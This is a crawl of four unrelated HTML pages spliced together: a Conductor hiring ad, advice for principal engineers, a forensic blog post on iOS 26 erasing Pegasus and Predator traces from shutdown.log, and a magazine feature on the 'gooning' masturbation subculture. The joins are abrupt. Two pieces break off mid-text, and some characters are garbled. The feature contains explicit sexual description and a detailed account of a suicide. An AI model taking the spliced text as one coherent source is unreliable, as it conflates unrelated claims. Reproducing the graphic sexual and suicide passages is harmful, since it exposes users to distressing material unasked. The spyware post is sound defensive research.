    &lt;p&gt;We write most of our code in Typescript, but Typescript experience is not necessary. We’re looking for the kind of person who can figure it out on the job.&lt;/p&gt;
    &lt;p&gt;Pay&lt;/p&gt;
    &lt;p&gt;Compared to similar companies at our stage, we aim to pay roughly median salary and 90th percentile equity.&lt;/p&gt;
    &lt;p&gt;We give out more stock than other companies because we hire less, and each employee can make an unusually large impact.&lt;/p&gt;
    &lt;p&gt;Health care&lt;/p&gt;
    &lt;p&gt;… and, most importantly, Real Health Care: sleep, nutrition, exercise, social support. We try to make Conductor a strongly positive influence on all those fronts. More about our culture.&lt;/p&gt;
    &lt;p&gt;Stuff&lt;/p&gt;
    &lt;p&gt;Your ideas here&lt;/p&gt;
    &lt;p&gt;Conductor is growing fast, and we want YOU to join us!&lt;/p&gt;
    &lt;p&gt;Conductor lets you run a bunch of coding agents in parallel. We’re used by engineers at YC, Linear, Vercel, Notion, Supabase, and many more. We're backed by some of the best investors in the valley.&lt;/p&gt;
    &lt;p&gt;There’s a ton to build. In the next few years, humans will shift focus from direct work (writing code) to orchestrating teams of AIs—and we're going to need entirely new interfaces to do it.&lt;/p&gt;
    &lt;p&gt;We're looking for generalist engineers and product designers to work with in person with us in our beautiful San Francisco office.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;What makes an effective principal engineer or scientist? Here, I’ve distilled what I’ve observed from role models and quoted some of their advice below. While my perspective is naturally Amazon-centric, these ideas should also apply to most principal tech IC roles. As always, use your best judgment and assess if this advice applies to you and your situation.&lt;/p&gt;
    &lt;p&gt;1. Different principals will have different flavors. Some dive deep in one space while others excel at horizontal influence. Some are technical trailblazers who show how things are done, while others clarify complexity and illuminate the path forward. Still others are masters at aligning multiple orgs towards a common vision. No one flavor is more important than the other, and you need to find the flavor that plays to your strengths.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Amazon very specifically says they want their principals hands on. Any principal who’s not being hands-on for an extended period of time (okay in short bursts) is likely setting themselves up for failure.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;2. The work that was core, and made you successful in your previous role, is now the side task. At this level, writing the code yourself may not be the best use of your time. While you should still be writing code (to stay connected to the work), your core role is now technical vision, design feedback, sponsorship, providing business, product, and technical context, finding new problems, connecting the dots, etc.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“This is a well-known saying for L7+ roles. It is not saying that you should spend less time coding, but that even if you are still coding 80% of the time, the most impactful part of your role is how to make everyone more effective. The mindset shifts from focusing solely on coding for a single project or perfecting on your own to influencing how all builders can build better across projects. This can be through contributing high-quality code to the repository and letting the code speak for itself, but also through other efforts—arguably more effective—such as giving feedback on design proposals, writing technical guidance, and driving the long-term vision.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;3. You’re kind of a part-time PM for technology. Scratch that, you’re part-time everything: product, design, engineering, science, quality assurance, hiring, finance, culture, etc. Nothing is not your job. The high judgment you have allows you to step out of your wheelhouse.&lt;/p&gt;
    &lt;p&gt;4. Your role will involve more communication, influence, and connecting the right people. Your projects will typically be larger in scope, involving teams across directors and even VPs. These projects won’t succeed without effective alignment and collaboration, and you’ll want to be careful not to ship your org chart to customers.&lt;/p&gt;
    &lt;p&gt;5. Being right is less than half the battle. You also have to convince others that you’re right, and more importantly, convince them to care enough to act on it. This means figuring out how to build momentum, who can sponsor the idea, and how to get it over the finish line.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Sometimes it also means starting the project and showing value to gain these things. Principals should lead by example and we want people to be proactive in solving issues and not wait for committee.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;“I would almost say that principals are the committee, so who are you waiting for :)”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;6. A big part of the work is teaching the org to value something it doesn’t care about. Your audience will range from executives to working-level ICs. This is some of the hardest work you can do, and it fails often, but as someone who has an eye on the future and broader view, you should still do it. A mentor shared that for every 10 docs he pitched, probably three would get acted on, and he considered that a great outcome.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Compared to ICs who shoulder more of the day-to-day, team-level, and immediate deliverables, L7+ roles have more space to step back and take a broader, longer-term view of the company. It allows them to evaluate impact more objectively, and contributing at that level is where they add the most value—connecting to #7 below, those are the things that won’t happen without them.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;7. There’s a category of work that just won’t happen without you. It’s usually at the intersection of what you really care about and what you’re exceptional at. It could be building a quick prototype and socializing a new customer experience with leadership, building bridges across orgs or other practitioners in industry, or crafting the three-year vision. Focus on this category of work. Also, it’ll get deeper and narrower over the span of your career.&lt;/p&gt;
    &lt;p&gt;8. Sometimes, the most valuable thing you can do is not even to do the work but to connect the dots. This includes connecting teams who’re looking to do the work to teams who’ve done the work that they can reuse or learn from. It also includes identifying someone suitable who can do the work and grow along the way.&lt;/p&gt;
    &lt;p&gt;9. You can only do so much yourself. You’ll be more useful to the org spending part of the time coaching and mentoring others to be more effective. Perhaps set aside a few hours each week, such as office hours or regular syncs with folks you’re grooming. Identify one or two ICs you’d like to groom and set goals for yourself on how you’ll help them.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Scaling through others is the key point here. I like to think the success of a PE is when the org is able to make the same decisions as the PE would. Then the PE moves on to other ambiguous problems and set the culture to achieve the right outcomes.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;“While you will want to help everyone, however you have to focus your energy on building others who can take your place long term. Not everyone has that ability so you have to spend focused time on those that you see demonstrating the potential to take over from you and they can in turn help others that show less potential at the moment and enable them.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;10. Transition from involving others in the work to making the work theirs. Make it an opportunity for someone to do the work that got you to where you are. Support and set them up for success. Don’t worry, there’s a never-ending backlog of important problems and interesting opportunities to work on for customers.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“I tell folks that they should spend 1-2 hours a week with someone to scale them to achieve 40 hours of work under your insights. This is what the true Principal scale is of being able to find those small things that enable a Sr SDE to be even better.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;11. When you give others the work, it is now theirs. You can provide context and guidance, but ultimately, the direction is theirs to set. This includes letting them take an approach you wouldn’t take. If it goes poorly, we all get to learn from it; if it goes well, you get to learn something from it. Nonetheless, you should step in if the project is walking through a high-risk, one-way door that could backfire.&lt;/p&gt;
    &lt;p&gt;12. Create space for others in meetings. Sometimes, the room looks to the most senior person for their opinion or decision; you can create space for others by asking questions instead. Also, if you see someone who’s not participating, gently pull them in on topics that play to their strengths. And if the meeting forgot someone who should have been in the discussion, add them to the next occurrence.&lt;/p&gt;
    &lt;p&gt;13. You don’t always have to demonstrate value. Some of the most effective principals I’ve worked with go through an entire meeting silent, or barely leave comments during document reviews. If the team and discussion are going fine as it is, that’s great! It means you can take a step back from the workstream and focus your energies elsewhere.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Be careful on the other side of this: If you’re present and staying silent, you have some implicit approval. Beware of multi-tasking and what your presence means.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;14. In meetings with execs, it’s okay not to address every topic on the agenda. If they’re engaged in the topic, ask meaningful questions, and make the decisions or unblock the obstacles that only they can, that’s a good meeting.&lt;/p&gt;
    &lt;p&gt;15. Beware: If you work in a breadth role, your entire week can be filled with everything that comes at you. This includes reviews, escalations, emails, help needed, etc. This can become a bigger issue the longer you stay at an org, where you become the “go-to” person because you know so much or have earned that credibility. As a result, you’re now a “mandatory” attendee at every meeting. Learn to push back and guard your time, or else you’ll have no time to push for the ideas you really care about. You don’t need to be in every meeting or have an opinion on every idea, just the key ones that matter.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“One thing that a mentor shared with me is that you need time to think. If you are going from meeting to meeting, you can’t process things and can’t look ahead. You need to schedule quality thinking time and disconnect from meetings to really find that next big thing.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;“You need to look to delegate—set someone else up to be that person so that you can free up your time. This gives you benefits in freeing you up, but also helps put aside scope for someone new to help them grow.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;16. If you can’t explain why what you’re working on needs a principal, you might be working on the wrong thing. (This may also apply to L6s.)&lt;/p&gt;
    &lt;p&gt;17. Because of your position, you can sometimes improve outcomes with relatively low effort. The title grants you organizational privilege, and thus greater access to relationships and context. Combined with your experience, this allows you to see around corners better. Thus, you can meaningfully improve a project’s chances of success and outcomes by investing fairly little effort. This is high ROI, and when you spot such opportunities, act on them.&lt;/p&gt;
    &lt;p&gt;18. The title comes with an aura of credibility even when you shouldn’t have it. Sometimes, people read more into your offhand comments than they should, especially if they don’t know you well. As a result, they may do a lot of work because of a casual comment you made. This can be a waste of time and effort. Thus, be clear on what you do know, what you don’t know, what you’re asking for, and what you’re simply commenting on.&lt;/p&gt;
    &lt;p&gt;19. Don’t just say the “what”; also share the “why” you think so. This helps others make better decisions. It also reduces the chance that others say “Principal &amp;lt;NAME&amp;gt; said this and thus we should …” and parrot things you said without fully understanding why you said it.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“The kinds of problems that require L7 input usually involve decisions under significant uncertainty. What’s crucial—but also difficult—is articulating your mental model: How you arrive at a judgment without having all the information, and why certain pieces of knowledge are more important than other data points.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;20. Find mechanisms to stay in touch with teams. This can be design reviews, weekly demos, sitting nearby and keeping an ear out, team lunches, or casual hallway chats. This helps you keep a pulse on the org and where the key problems or opportunities are.&lt;/p&gt;
    &lt;p&gt;21. Help teams keep sight of the bigger picture. When the working level is focused on the thick of things and day-to-day delivery, they can sometimes lose sight of the bigger, longer-term problems/opportunities and get stuck in the local optima. With the context that you have, you can help remind teams of this.&lt;/p&gt;
    &lt;p&gt;22. Be pragmatic; balance seeing the big picture with accepting local solutions. Consult and listen to the working level on the details; they’re your on-the-ground experts.&lt;/p&gt;
    &lt;p&gt;23. You’ll be asked for reviews or promo feedback on someone that you’ve only spent an hour or two with. It’s okay to decline instead of providing poor-quality feedback that’s based on a tiny sample of their entire behavior.&lt;/p&gt;
    &lt;p&gt;24. Make time to interact with interns and their mentors. A few touch points during the internship can be transformative, including an early check-in (and course correction if necessary) and being there for demo day. Also, work with the mentors and interns towards deliverables that continue to be valuable beyond the internship, where others can extend the project. This includes product 1-pagers, working software, and technical documentation.&lt;/p&gt;
    &lt;p&gt;25. To get to principal, you need to put yourself on the critical path. To be effective as a principal and go beyond it, you need to actively remove yourself from it. While you were previously the “go-to” person, you want to transition from essential to adjacent. The org should increasingly benefit from you, but shouldn’t be dependent on you to be effective. Think about how you can empower others to make the contributions you’re making.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Be careful about injecting yourself in critical path projects. Your focus is a lot more prone to being stolen by some other priority, so you need to keep yourself out of the critical path or be really stringent about locking down if you are in the critical path.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;26. If you were promoted to principal, it’s because you’ve been acting as a principal for a while. Typically, for more than a year. Thus, don’t worry about the increased expectation of the title. Just keep doing what you’re doing, engage with other principals, figure out your style, and work with your leadership to identify your focus areas.&lt;/p&gt;
    &lt;p&gt;27. With great freedom comes great responsibility. You have the autonomy to choose what to work on, but there’s the expectation of accountability and impact. The freedom isn’t about doing what you want, but ownership of finding the highest leverage problems to solve. Don’t expect to be told what to do or be given any guidance. You’re expected to figure out what the org should focus on.&lt;/p&gt;
    &lt;p&gt;28. Define and align your charter with your leadership. One way is to split your work into three buckets: (i) owner, (ii) sponsor, (iii) consultant. As a consultant, you’re involved in reviews and provide guidance, and have a high-level understanding of the system’s or product’s intent. As a sponsor, in addition to the above, you make the idea a priority for the org, work to build alignment and drive decisions, and engage with stakeholders. As an owner, it’s everything above, plus being the system expert and first point of contact, and having borderline obsession with the success of the design, execution, and impact. I tend to own 1 - 2 projects (&amp;gt; 50% time), sponsor 2 - 3 projects (~20% time), and consult the rest of my time.&lt;/p&gt;
    &lt;p&gt;29. Being a principal can be lonely. You’re part of all teams but also part of none. Build a network of peers with whom you can have open conversations. It likely doesn’t matter if you’re working in the same company or domain.&lt;/p&gt;
    &lt;p&gt;30. Don’t neglect your own needs. Make time and space for projects that support your learning, growth, and wellbeing. While it can feel selfish in the short term, it’s far more preferable to you burning out on the org. If you’re actively looking for work that keeps you healthy and happy and growing, your org benefits too, and it’s easier for them to retain you. Work with your manager on how to balance this.&lt;/p&gt;
    &lt;p&gt;31. Keep learning; our industry moves fast. If you take on projects that teach you nothing, or at least nothing relevant to your work, you’re moving backwards. This is sometimes inevitable—timebox such projects when they come along. Also, your learning doesn’t have to solely come from the job. I know PEs who find time to read papers and technical textbooks, and hack on prototypes over weekends to better understand new ideas and technology.&lt;/p&gt;

    &lt;head rend="h1"&gt;Key IOCs for Pegasus and Predator Spyware Cleaned With iOS 26 Update&lt;/head&gt;
    &lt;p&gt;By Matthias Frielingsdorf, VP of Research&lt;/p&gt;
    &lt;p&gt;Oct 21, 2025&lt;/p&gt;
    &lt;p&gt;As iOS 26 is being rolled out, our team noticed a particular change in how the operating system handles the shutdown.log file: it effectively erases crucial evidence of Pegasus and Predator spyware infections. This development poses a serious challenge for forensic investigators and individuals seeking to determine if their devices have been compromised at a time when spyware attacks are becoming more common.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;The Power of the shutdown.log&lt;/head&gt;
    &lt;p&gt;For years, the shutdown.log file has been an invaluable, yet often overlooked, artifact in the detection of iOS malware. Located within the Sysdiagnoses in the Unified Logs section (specifically, Sysdiagnose Folder -&amp;gt; system_logs.logarchive -&amp;gt; Extra -&amp;gt; shutdown.log), it has served as a silent witness to the activities occurring on an iOS device, even during its shutdown sequence.&lt;/p&gt;
    &lt;p&gt;In 2021, the publicly known version of Pegasus spyware was found to leave discernible traces within this shutdown.log. These traces provided a critical indicator of compromise, allowing security researchers to identify infected devices. However, the developers behind Pegasus, NSO Group, are constantly refining their techniques, and by 2022 Pegasus had evolved.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;Pegasus's Evolving Evasion Tactics&lt;/head&gt;
    &lt;p&gt;While still leaving evidence in the shutdown.log, their methods became more sophisticated. Instead of leaving obvious entries, they began to completely wipe the shutdown.log file. Yet, even with this attempted erasure, their own processes still left behind subtle traces. This meant that even a seemingly clean shutdown.log that began with evidence of a Pegasus sample was, in itself, an indicator of compromise. Multiple cases of this behavior were observed until the end of 2022, highlighting the continuous adaptation of these malicious actors.&lt;/p&gt;
    &lt;p&gt;Following this period, it is believed that Pegasus developers implemented even more robust wiping mechanisms, likely monitoring device shutdown to ensure a thorough eradication of their presence from the shutdown.log. Researchers have noted instances where devices known to be active had their shutdown.log cleared, alongside other IOCs for Pegasus infections. This led to the conclusion that a cleared shutdown.log could serve as a good heuristic for identifying suspicious devices.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;Predator's Similar Footprint&lt;/head&gt;
    &lt;p&gt;The sophisticated Predator spyware, observed in 2023, also appears to have learned from the past. Given that Predator was actively monitoring the shutdown.log, and considering the similar behavior seen in earlier Pegasus samples, it is highly probable that Predator, too, left traces within this critical log file.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;iOS 26: An Unintended Cleanse&lt;/head&gt;
    &lt;p&gt;With iOS 26 Apple introduced a changeâeither an intentional design decision or an unforeseen bugâthat causes the shutdown.log to be overwritten on every device reboot instead of appended with a new entry every time, preserving each as its own snapshot. This means that any user who updates to iOS 26 and subsequently restarts their device will inadvertently erase all evidence of older Pegasus and Predator detections that might have been present in their shutdown.log.&lt;/p&gt;
    &lt;p&gt;This automatic overwriting, while potentially intended for system hygiene or performance, effectively sanitizes the very forensic artifact that has been instrumental in identifying these sophisticated threats. It could hardly come at a worse time - spyware attacks have been a constant in the news and recent headlines show that high-power executives and celebrities, not just civil society, are being targeted.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;Identifying Pegasus 2022: A Specific IOC&lt;/head&gt;
    &lt;p&gt;For those still on iOS versions prior to 26, a specific IOC for Pegasus 2022 infections involved the presence of a /private/var/db/com.apple.xpc.roleaccountd.staging/com.apple.WebKit.Networking entry within the shutdown.log. This particular IOC also revealed a significant shift in NSO Group's tactics: they began using normal system process names instead of easily identifiable, similarly named processes, making detection more challenging.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;Correlating Logs for Deeper Insight (&amp;lt; iOS 18)&lt;/head&gt;
    &lt;p&gt;For devices running iOS 18 or earlier, a more comprehensive approach to detection involved correlating containermanagerd log entries with shutdown.log events. Containermanagerd logs contain boot events and can retain data for several weeks. By comparing these boot events with shutdown.log entries, investigators could identify discrepancies. For example, if numerous boot events were observed before shutdown.log entries, it suggested that something was amiss and potentially being hidden.&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;lb/&gt;Before You Update&lt;/head&gt;
    &lt;p&gt;Given the implications of iOS 26's shutdown.log handling, it is crucial for users to take proactive steps:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Before updating to iOS 26, immediately take and save a sysdiagnose of your device. This will preserve your current shutdown.log and any potential evidence it may contain.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Consider holding off on updating to iOS 26 until Apple addresses this issue, ideally by releasing a bug fix that prevents the overwriting of the shutdown.log on boot.&lt;/p&gt;
      &lt;/item&gt;

    &lt;head rend="h1"&gt;The Goon Squad&lt;/head&gt;
    &lt;p&gt;This past January, a few dozen young men in hoodies and baggy jeans congregated outside a coffee shop in Tempe, Arizona, to mourn the death of a twenty-seven-year-old man named Nautica Malone. They arrived on foot and riding shotgun in parents’ cars; they carried flowers and votive candles, homemade placards and shirts printed with Malone’s smiling face. The café where they were gathered, Bikini Beans, was part of a chain whose baristas wear bikinis. Days earlier, Malone had pulled up to the drive-through window, nude from the waist down, a hand on his penis. The barista was already filming by the time the car reached her window. It’s hard to say why this particular sex crime went viral. Maybe it was something about Malone’s expression: he looked confident, even sultry, like he was hoping somehow to seduce the barista. Whatever the reason, the video was soon inescapable online. The view count was still climbing when Malone drove a few towns over and shot himself in the head in the front seat of his Dodge Challenger, leaving a note to his wife and young children asking for their forgiveness.&lt;/p&gt;
    &lt;p&gt;Malone’s death was covered widely in the tabloids and trended on social media, where it was described as the “Goonicide.” His vigil, meanwhile, was an ironic, livestreamed stunt that came to be known as the “Gooneral.” Remarkably, this language—Goonicide, Gooneral—was broadly legible to hundreds of thousands of people who engaged with it online. The implication, unmistakable, was that the verb “to goon,” the root of these terms, had broken containment. By the time you read this article, a full definition might be needless, but in the sincere hope that that day has yet to—will never—arrive, I will provide one.&lt;/p&gt;
    &lt;p&gt;Gooning is a new kind of masturbation. More precisely, a new kind of masturbation at the heart of an internet-based, pornography-obsessed, Gen Z–dominated subculture every bit as defined and vibrant as the hippies or punks in their prime. The act itself resembles “edging”—repeatedly bringing oneself to the point of climax without actually climaxing. But gooning is more goal-oriented and more communal. The gooner goons to reach the “goonstate”: a supposed zone of total ego death or bliss that some liken to advanced meditation, the attainment of which compels them to masturbate for hours, or even days, at a time. The Gooneral’s attendees didn’t care that Malone was, from all available evidence, not a gooner at all but rather an unaffiliated, lone-wolf pervert. That he’d been, in their eyes, martyred for a form of self-expression was enough to make him a cause célèbre for what was increasingly coming to feel like a movement, a homegrown zoomer Tea Party that might one day produce its own gooner congressmen, gooner news networks, extremist gooner terror attacks.&lt;/p&gt;
    &lt;p&gt;The gooners first came to limited public attention by way of their “gooncaves”: rooms remodeled in the service of porn consumption. You’d think a person, having just built a gooncave, would take every possible measure to conceal its existence, would bulk-purchase padlocks, price high-end CCTV systems, craft detailed alibis for every hour, every minute spent alone, and would still, after all that, bolt awake in the middle of the night, heart pounding at the fear of discovery. Instead, the gooners bragged about them. They posted photos of their gooncaves to Reddit. And these photos, which circulated through the young-to-youngish internet as early as 2021, were astonishing. One of course noticed the screens, sometimes three or four of them, sometimes upwards of a dozen, each lit up with porn, but one especially noticed the gooners’ own erect penises, foregrounded in the frame like waggish thumbs-ups. These were porn shrines. In hindsight, they were also leading indicators of some of the very serious psychological damage the lockdowns had wrought on the world. Those early-COVID images of depopulated city streets—these were their precise corollary. They showed you where the people went. Or where at least some of them did, likely the ones who were not exactly models of stability and robust mental health to begin with. Even so, it seemed beyond dispute that sixty years ago some of these gooners would have been fathers. Small-business owners. Dependable men in hats riding slow commuter trains, their mindscapes perfumed with thoughts of stocks, bonds, lawn care. Well, what could you do? Certain social systems had failed, certain historical trend lines had converged, and now we had these guys to deal with.&lt;/p&gt;
    &lt;p&gt;No one, besides maybe Neil Postman, could have predicted the formation of an international pornography cult. But the gooners’ rise does, in retrospect, possess a certain inevitability. Anyone paying attention to online porn’s evolution over the preceding twenty years could sense, in its brain-melting variety and abundance, the blueprint for a new kind of person, a new relationship to human sexuality. In my own lifetime, I have seen incredible advances in the world of pornography. When I was a boy, there were still porn magazines; fathers hid them on high shelves. You stood on stools and gawked at them in a state of mortal terror. But by the time I started college, in the late Aughts, the foundations of our present porn environment were firmly established. Widespread broadband internet had enabled the rise of the so-called tube sites: platforms like Pornhub, which streamed untold numbers of clips free of charge. Then came the smartphones, transforming every toilet stall into a potential porn theater. The very air, suddenly, was misted with pornography.&lt;/p&gt;
    &lt;p&gt;In this earlier stage, if you wanted to watch porn, you still had to actively seek it out. That has since changed. Right as gooners began to solidify as a social force, I could no longer open Instagram without encountering dozens of large-breasted women skipping rope, romping in tank tops, brushing their teeth while drooling erotically. It was the same story on TikTok, the little of it I watched. Twitter was the exception: there I simply encountered uncut, hardcore pornography. We make our own algorithms, I know, but I don’t think I was uniquely deviant. The situation was the same for nearly every straight man I knew. Invariably this content was intended to funnel the viewer to platforms like OnlyFans, where a paid subscription would allow them to spend even more money on special extras like personalized dick evaluations or nude kitchen-cleaning videos. It seemed increasingly plausible that, faced with this onslaught, some percentage of psychically defenseless men would simply crumple, follow the platforms’ logic, and start watching porn full-time.&lt;/p&gt;
    &lt;p&gt;Some part of me, I’m saying, was convinced that these gooners were human. Almost certainly they had, in their lives, hugged grandparents, cuddled pets. Bundled in winter coats, they had sled down snowy inclines, secure in a legal guardian’s love. None of them had thought, When I grow up, I want to consume pornography in such immense quantities that strangers will fear for my sanity. None of them had lovingly sketched, on the backs of geometry worksheets, the gooncaves where they would one day jerk off, should life go according to plan. I wanted to find these people. I wanted to talk to them. They were, I had come to feel, emissaries of a future I could just barely glimpse. I figured they might have something to teach me.&lt;/p&gt;
    &lt;p&gt;So where were the gooners? A few seconds’ research revealed their home base: Discord, a social messaging platform not unlike Slack, offering a multiverse of chat-room servers accessible by invitation. If Instagram was where millennials went to post infographics about racial disparities in income and policing, Discord was where zoomers went to swap the screeds of lesser-known school shooters. Or to talk about gaming. Or whatever zoomers did. This was supposedly where the online youth were headed: away from their parents’ social platforms into private, self-policed spaces, little islands of affinity. I joined the first relevant server I could find: the GoonVerse, which had more than fifty thousand members. I examined the rules, which were at once surprisingly woke (no hate speech, no misgendering) and strict enough regarding the posting of child pornography as to suggest a serious and recurrent problem. Before entering, I was prompted to choose my “roles.” Age, region, and gender I could make sense of, but things grew confusing from there. Did I want to be “pinged for tournaments”? Was I a “hentai wankbattler,” or merely a “regular wankbattler”? These questions I answered at random, and then I entered the “stream room.”&lt;/p&gt;
    &lt;p&gt;Picture this: you work for a masturbation factory in hell. You log on to your scheduled workplace Zoom call. What do you see? You see what I saw in the GoonVerse. There was, inescapably, the porn itself, which occupied most of the screen, a hyperkinetic montage of tremendous penises barreling into and out of Japanese cartoon heroines, crudely rendered CGI horse-women, and actual female porn stars. Then, of course, there were the gooners, arrayed side by side in boxes at the bottom of the screen, their heads obscured—cut off by their cameras at the neck—and their hands in frantic motion. Primitive fears from childhood surfaced in an inchoate rush: a gigantic omnivorous worm I once saw in a movie on TV; the uncontrolled swarm of color that consumed the screen whenever my family’s PC crashed, suggesting something organic and harm-intending in what was supposed to be just a machine. One of the guys in the stream room was masturbating on the toilet. One of them looked like he was masturbating in jail.&lt;/p&gt;
    &lt;p&gt;Okay, I thought, this is interesting. This is a lot. I’ll come back to this. I decided to try my luck on X, where I found self-described “handpumpers” and “pumpsluts” praising “fat juicy cellulite wobblemeat,” practicing “gooncraft,” and thirsting for “goonfuel.” My eyes were still adjusting to this assault when I came across a poster going by the username Gooncultist. He was the kind of chronic social-media user who works full-time in tech and was seemingly raised by niche online-forum moderators, but who nonetheless exhibits a curious fluency in continental philosophy. (One representative tweet began: “yknow corruption/pornification kink fit really well into post-9/11 baudrillard.”) Finding him among this welter of lunatics was a tremendous relief: here, at least, was someone who seemed to acknowledge that what was going on here was strange, that a normal person might find it repellent. Clearly I needed an entrée into this world, someone to ground my investigations; maybe Gooncultist could help. I sent him a message.&lt;/p&gt;
    &lt;p&gt;When we spoke on the phone a few days later, Gooncultist offered a deep prehistory of gooning. It is his contention that at least one strain of this practice has its origins among certain 4chan users, who would play an image- and text-based game called Fap Roulette on the site. (Imagine one of those niche small-batch board games with multiple dice and fifty-page rule books. Now imagine that the rules are poorly photoshopped onto an image of a ludicrously proportioned cartoon woman. Now imagine eating your own ejaculate off the floor because the cartoon woman told you to. That is, from what I can make of its surviving remnants, Fap Roulette.) As for the on-cam streaming stuff, Gooncultist traces it to something called Rabbit, a platform designed to allow users to watch Netflix together, which proto-gooners found their own novel uses for. But as Gooncultist emphasized, any attempt at a comprehensive, linear history of gooning is doomed to failure. Like MAGA, it is a big-tent movement in which many eccentric tendencies have converged.&lt;/p&gt;
    &lt;p&gt;When I asked Gooncultist to describe the average gooner, he insisted that such a person is a “statistical fiction.” The community is too vast, composed of too many distinct and overlapping spheres. Gooncultist himself is fairly ecumenical, as far as gooners go—he has his niche fixations, which I won’t ruin your day by describing, but he seems to dabble in much of what the space has to offer. There are definite camps in Goonworld, as I was quickly coming to learn. Once I had acclimated myself to the gooners’ online spaces, I could identify at least a dozen of them. Their names meant little to me then, but they would signify soon enough: the cringe gooners, the e-girl fanatics, the BNWO freaks; the intox types and the PMV buffs; the battlers and feeders and drainers. There were also the more or less open pedophiles assembled under the “No Limits” flag, chased from Discord to Discord and explicitly banned from most I encountered. But what statistics was Gooncultist talking about, exactly? Over hours of focused trawling, I couldn’t identify a single rigorous study of gooning culture; cybersexologists, having quantified every twitch and spasm of the online erotic imaginary, had overlooked the gooners almost entirely.&lt;/p&gt;
    &lt;p&gt;Without big-picture ballast, I’d never nail down the gooner soul. Thus was born the Gooning Questionnaire: thirty-three questions touching on such subjects as session duration, porn preferences, pre-gooning sexual history, etc. I pushed it on as many gooners as I could find.&lt;/p&gt;
    &lt;p&gt;I’d figured that the gooners would need some coaxing, some assurance that I wasn’t setting them up to be ridiculed. But it was like they’d been waiting to hear from me; they flocked to the Questionnaire in droves. I had to cap it at around a hundred respondents. Within a few days, I had more raw data than I could ever hope to parse. But from the roiling swamp of responses—eighty thousand words of often movingly ungrammatical text from respondents largely based in the United States and Europe but encompassing at least four South Americans and two guys in Africa—we can rescue a few broad insights.&lt;/p&gt;
    &lt;p&gt;For one thing, and crucially: most gooners do not regularly masturbate for eight to twelve hours at a stretch, as I’d initially been led to believe. They tend to do that only a few times a month, the rest of the time masturbating for—and I really did try to calculate this—an average of two or three hours a day. In other words, the goonstate, so central to the subculture’s branding and self-conception, is only rarely attained. (A sizable minority of respondents claimed never to have reached it, although none doubted its existence.) Like runner’s high, or epiphany in prayer, the goonstate is not the point of the practice, but rather its occasional and unbidden reward. You’ll never get there if you don’t put in the work. As for what “there” refers to—what the goonstate actually feels like—a sampling from the Questionnaire should get the point across:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;It’s like being high while high&lt;/p&gt;
      &lt;p&gt;Intense bliss pure happiness and love&lt;/p&gt;
      &lt;p&gt;It’s so beautiful! It’s sublime. Like being washed away.&lt;/p&gt;
      &lt;p&gt;It’s like I’m in antigravity or covered in liquid. tingles all over me, brain fuzzy, skin tingling all over. No fears about cumming, because this was the real pleasure I was after, and I couldn’t cum at that point if I wanted to anyway.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;What binds these disparate masturbators together, then, are the communal rituals surrounding the goonstate: 70 percent of Questionnaire respondents claimed to engage in one or more of them. By far the most popular of these rituals is “feeding,” a sort of porn-mediated cybersex in which one gooner sustains another’s session by sending them curated porn from their private collection. (This, apparently, is what is meant by “goonfuel.”) Sometimes they send short clips, sometimes they send GIFs, but more often than not they send what are known as “gooncaps”—essentially, pornographic memes. (A lively economy surrounds the production of gooncaps: one Bulgarian teen I spoke with—who took pains to distinguish himself from a real gooner—told me that he and his friends earn a modest living churning out customized gooncaps part-time. He agreed to talk to me because, in his words, “I would like to shed some light on how the moral systems are failing some of the younger people.”)&lt;/p&gt;
    &lt;p&gt;Other gooners engage in “wankbattling,” a kind of competitive feeding in which players rate one another’s porn selections on a ten-point scale. I learned all about it from Fuji, as he called himself, a twenty-three-year-old Egyptian gooner I met while conducting supplementary fieldwork in a wankbattling server on Discord. Many things about Fuji were compelling—for instance, he’d spent months training his pubococcygeus muscle in order to climax without ejaculating and thus to spend even more time masturbating to porn based on his favorite video-game characters. But I was particularly intrigued by his relationships with his fellow wankbattlers. There appeared to be real tenderness there, as in this exchange Fuji showed me between himself and a fellow gooner:&lt;/p&gt;
